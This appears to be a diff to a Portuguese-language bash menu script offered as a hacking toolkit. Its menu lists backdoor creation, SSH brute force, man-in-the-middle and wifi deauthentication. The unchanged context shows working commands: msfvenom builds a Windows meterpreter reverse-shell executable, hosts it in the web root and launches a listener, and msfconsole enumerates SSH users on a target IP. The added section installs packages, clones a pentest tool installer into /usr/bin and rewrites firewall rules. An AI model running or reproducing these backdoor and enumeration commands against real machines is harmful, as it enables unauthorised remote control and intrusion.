@@ -46,12 +46,12 @@ do
  echo "# 1-BackDoor                     #"
  echo "# 2-Fotos                        #"
  echo "# 3-FootPrint                    #"
- echo "# 4-Livros                       #"
+ echo "# 4-Livros de todos os gostos    #"
  echo "# 5-Aprender Shell Script        #"
  echo "# 6-Debian                       #"
- echo "# 7-Ubuntu                       #"
+ echo "# 7-Derivados Do Ubuntu          #"
  echo "# 8-Arch Linux                   #"
- echo "# 9-Kali Linux                   #"
+ echo "# 9-DebianXFCE                   #"
  echo "# 10-Rede Interna                #"
  echo "# 11-Integridade (Hash)          #"
  echo "# 12-Brut Force   SSH            #"
@@ -60,6 +60,7 @@ do
  echo "# 15-Main The Middle             #"
  echo "# 16-Derrubar wifi               #"
  echo "# 17-Enumerar users SSH          #"
+ echo "# 18-Ubuntu                      #"
  echo "##################################"
  echo "#  R-Exite                       #"
  echo "##################################"
@@ -74,7 +75,7 @@ do
     echo "Criando a backdoor....."
     echo "BackDoor Salva na /var/www/html"
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > /var/www/html/$nome
- 
+
     msfconsole -x "use exploit/multi/handler; setg payload windows/meterpreter/reverse_tcp; setg lhost "$ip"; setg lport "$porta"; exploit" ;;
 
  2) git clone https://github.com/Leonardoimui/Pictures.git ;;
@@ -281,6 +282,51 @@ do
      read -p "Informe o IP do ALVO: " mesa
      read -p "Informe a userlist: " ario
      msfconsole -x "use auxiliary/scanner/ssh/ssh_enumusers; setg rhosts "$mesa"; setg threshold "11"; setg user_file "$ario"; exploit" ;;
+
+ 18)apt-get install virtualbox
+    apt-get install postgresql
+    apt-get install apache2
+    apt-get install gedit
+    apt-get install leafpad
+    apt-get install kdenlive
+    apt-get install figlet
+    apt-get install conky
+    apt-get install docky
+    apt-get install evince
+    apt-get install kazam
+    apt-get install geany
+    apt-get update
+    echo "Baixando pacotes de personalização...."
+    sudo add-apt-repository ppa:ravefinity-project/ppa -y && sudo add-apt-repository ppa:numix/ppa -y && sudo add-apt-repository ppa:snwh/pulp -y && sudo apt-get update && sudo apt-get install ambiance-flat-colors radiance-flat-colors vivacious-colors ambiance-blackout-flat-colors paper-icon-theme paper-gtk-theme numix-icon-theme-circle ubuntu-restricted-extras unity-tweak-tool -y
+    echo "Baixando Katoolin para instalar ferramentas de Pentest..."
+    git clone https://github.com/LionSec/katoolin.git && cp katoolin/katoolin.py /usr/bin/katoolin
+    chmod +x /usr/bin/katoolin
+    echo "Configurando o Firewall..."
+    iptables -F
+    iptables -A INPUT -p tcp -m tcp --dport 80 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
+    iptables -A INPUT -p tcp -m tcp --dport 8080 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
+    iptables -A INPUT -p tcp -m tcp --dport 22 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
+    iptables -A INPUT -p tcp -m tcp --dport 21 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
+    iptables -A INPUT -p tcp -m tcp --dport 3306 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
+    iptables -A INPUT -p tcp -m tcp --dport 5432 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
+    iptables -A INPUT -p tcp -m tcp --dport 81 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
+    iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 80 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 22 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 21 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 8080 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 23 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 5432 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 3306 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 631 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 443 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 4444 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 111 -j DROP
+    iptables -A INPUT -p tcp -m tcp --dport 9050 -j DROP
+    echo "Baixando Pacote do Iptables...."
+    apt-get install iptables-persistent
+    iptables-save
+    echo "Parabńes Firewall configurado com Sucesso!" ;;
 
 
 
